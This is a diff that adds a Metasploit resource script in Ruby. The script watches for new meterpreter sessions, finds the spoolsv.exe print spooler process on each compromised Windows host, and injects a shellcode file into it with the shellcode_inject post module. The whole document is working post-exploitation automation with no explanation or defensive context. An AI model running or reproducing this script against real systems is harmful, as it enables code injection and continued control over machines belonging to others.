@@ -1,0 +1,27 @@
+<ruby>
+already_run = Array.new
+run_single("use post/windows/manage/shellcode_inject")
+run_single("set SHELLCODE /path/to/shellcode.bin")
+while(true)
+  framework.sessions.each_pair do |sid,s|
+    session = framework.sessions[sid]
+    if(session.type == "meterpreter")
+      sleep(2)
+      unless already_run.include?(s)
+        print_line("starting recon commands on session number #{sid}")
+        target_proc = session.console.run_single("pgrep spoolsv.exe")
+        session.sys.process.get_processes().each do |proc|
+          if proc['name'] == "spoolsv.exe"
+            target_proc = proc['pid']
+          end
+        end
+        print_line("targeting process: #{target_proc}")
+        run_single("set SESSION #{sid}")
+        run_single("set PID #{target_proc}")
+        run_single("run")
+        already_run.push(s)
+      end     
+    end
+  end
+end
+</ruby>
